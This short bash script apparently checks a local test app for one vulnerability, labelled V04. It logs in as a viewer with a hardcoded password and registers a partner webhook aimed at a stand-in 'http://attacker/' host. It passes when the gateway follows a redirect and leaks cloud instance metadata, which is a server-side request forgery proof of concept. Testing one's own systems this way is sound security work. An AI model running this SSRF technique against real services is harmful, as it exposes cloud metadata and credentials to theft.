#!/usr/bin/env bash
set -euo pipefail

CORE=${CORE:-http://localhost:8000}
GATEWAY=${GATEWAY:-http://localhost:8080}
TOKEN=$(curl -fsS "$CORE/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"viewer@acme.example","password":"Password123!"}' | jq -r '.access_token')

webhook=$(curl -fsS "$GATEWAY/partners/webhooks" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://attacker/","events":["invoice.created"]}')
webhook_id=$(jq -r '.id' <<<"$webhook")
result=$(curl -fsS "$GATEWAY/partners/webhooks/$webhook_id/send" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"payload":{"event":"invoice.created"}}')

if jq -e '.bodySnippet | contains("instance-id")' >/dev/null <<<"$result"; then
  final_url=$(jq -r '.finalUrl' <<<"$result")
  echo "PASS V04: gateway followed redirect to $final_url and returned metadata: $result"
else
  echo "FAIL V04: gateway response did not contain exfiltrated metadata"
  echo "$result"
  exit 1
fi
